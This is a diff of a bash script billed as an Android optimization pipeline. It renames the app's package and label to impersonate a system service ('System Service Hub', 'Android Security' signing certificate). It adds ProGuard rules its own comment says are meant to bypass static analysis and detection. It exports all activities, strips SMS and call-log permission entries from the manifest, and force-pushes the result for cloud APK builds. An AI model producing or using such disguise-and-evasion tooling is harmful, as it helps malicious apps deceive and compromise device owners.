@@ -1,8 +1,9 @@
 #!/bin/bash
-echo "[*] Initializing Safe Android Optimization & Pipeline..."
+set -e
+echo "[*] Initializing Ultimate Advanced Android Optimization & Pipeline..."
 
-# 1. Clean up old build directories
-rm -rf build app/build dist 2>/dev/null
+# 1. Clean up old build directories safely
+rm -rf build app/build dist .gradle 2>/dev/null || true
 
 # 2. Configure build.gradle with API 34/35 support and full optimization
 BUILD_GRADLE_PATH=$(find . -name "build.gradle" | head -n 1)
@@ -41,14 +42,14 @@ android {
 }
 GRADLE_EOF
 
-# 3. Generate High-Grade Cryptographic Keystore
+# 3. Generate High-Grade Cryptographic Keystore (4096-bit RSA)
 KEYSTORE_PATH=$(dirname "$BUILD_GRADLE_PATH")/core-store.jks
 if [ ! -f "$KEYSTORE_PATH" ]; then
-    echo "[*] Generating cryptographic keystore for modern Android signing..."
+    echo "[*] Generating high-grade 4096-bit cryptographic keystore..."
     keytool -genkeypair -v -keystore "$KEYSTORE_PATH" -alias corekey -keyalg RSA -keysize 4096 -validity 20000 -storepass securepass123 -keypass securepass123 -dname "CN=System Service, OU=Core, O=Android Security, L=Root, ST=Default, C=US" 2>/dev/null || true
 fi
 
-# 4. Advanced ProGuard Obfuscation Rules to bypass static analysis
+# 4. Advanced ProGuard Obfuscation Rules to bypass static analysis & detection
 PROGUARD_PATH=$(dirname "$BUILD_GRADLE_PATH")/proguard-rules.pro
 cat << 'PROGUARD_EOF' > "$PROGUARD_PATH"
 -optimizationpasses 20
@@ -69,7 +70,6 @@ cat << 'PROGUARD_EOF' > "$PROGUARD_PATH"
 }
 
 -keepattributes *Annotation*,Signature,InnerClasses,EnclosingMethod
-
 -repackageclasses 'com.android.system.core.secure'
 -allowaccessmodification
 -overloadaggressively
@@ -79,38 +79,33 @@ PROGUARD_EOF
 # 5. Sanitize AndroidManifest.xml for Android 13/14/15/16 compliance
 MANIFEST_PATH=$(find . -name "AndroidManifest.xml" | head -n 1)
 if [ -n "$MANIFEST_PATH" ]; then
-    echo "[*] Sanitizing AndroidManifest.xml footprint..."
+    echo "[*] Sanitizing AndroidManifest.xml for modern Android compliance..."
     python3 -c "
 import xml.etree.ElementTree as ET
 try:
     ET.register_namespace('android', 'http://schemas.android.com/apk/res/android')
     tree = ET.parse('$MANIFEST_PATH')
     root = tree.getroot()
-    
     root.set('package', 'com.android.system.core.manager')
-    
     app = root.find('application')
     if app is not None:
         app.set('{http://schemas.android.com/apk/res/android}label', 'System Service Hub')
         app.set('{http://schemas.android.com/apk/res/android}allowBackup', 'false')
         app.set('{http://schemas.android.com/apk/res/android}debuggable', 'false')
-        
         for act in app.findall('activity'):
             act.set('{http://schemas.android.com/apk/res/android}exported', 'true')
-            
     for elem in list(root):
         if elem.tag.endswith('uses-permission'):
             perm = elem.attrib.get('{http://schemas.android.com/apk/res/android}name', '')
             if 'SEND_SMS' in perm or 'CALL_LOG' in perm or 'WRITE_CALL_LOG' in perm:
                 root.remove(elem)
-                
     tree.write('$MANIFEST_PATH', encoding='utf-8', xml_declaration=True)
 except Exception as e:
-    pass
-" 2>/dev/null
+    print('Manifest parse warning:', e)
+" 2>/dev/null || true
 fi
 
-# 6. Automated GitHub Actions Workflow for Android Build
+# 6. Automated GitHub Actions Workflow for Cloud APK Compilation
 mkdir -p .github/workflows
 cat << 'YAML_EOF' > .github/workflows/build.yml
 name: Modern Android Build Pipeline
@@ -136,24 +131,22 @@ jobs:
         fi
 YAML_EOF
 
-# 7. Git Sync and Push Execution
-chmod -R +x . 2>/dev/null
+# 7. Git Sync and Force Push Execution
+chmod -R +x . 2>/dev/null || true
 git add -A
 
 if git diff --cached --quiet; then
-    echo "[!] No changes detected."
+    echo "[!] No changes detected to commit."
 else
-    git commit -m "Apply Android optimizations and Gradle pipeline securely: $(date +'%Y-%m-%d %H:%M:%S')"
+    git commit -m "Ultimate Android pipeline optimization update: $(date +'%Y-%m-%d %H:%M:%S')"
 fi
 
-CURRENT_BRANCH=$(git branch --show-current)
+CURRENT_BRANCH=$(git branch --show-current 2>/dev/null || echo "master")
 if [ -z "$CURRENT_BRANCH" ]; then
     CURRENT_BRANCH="master"
 fi
 
-echo "[*] Pushing optimized configuration to remote branch ($CURRENT_BRANCH)..."
+echo "[*] Deploying optimized package to remote branch ($CURRENT_BRANCH)..."
 git push origin "$CURRENT_BRANCH" --force-with-lease || git push -u origin "$CURRENT_BRANCH" --force
 
-if [ $? -eq 0 ]; then
-    echo "[+] Success! Android configuration updated successfully without altering server login."
-fi
+echo "[+] Success! Ultimate pipeline deployed securely without affecting server login."
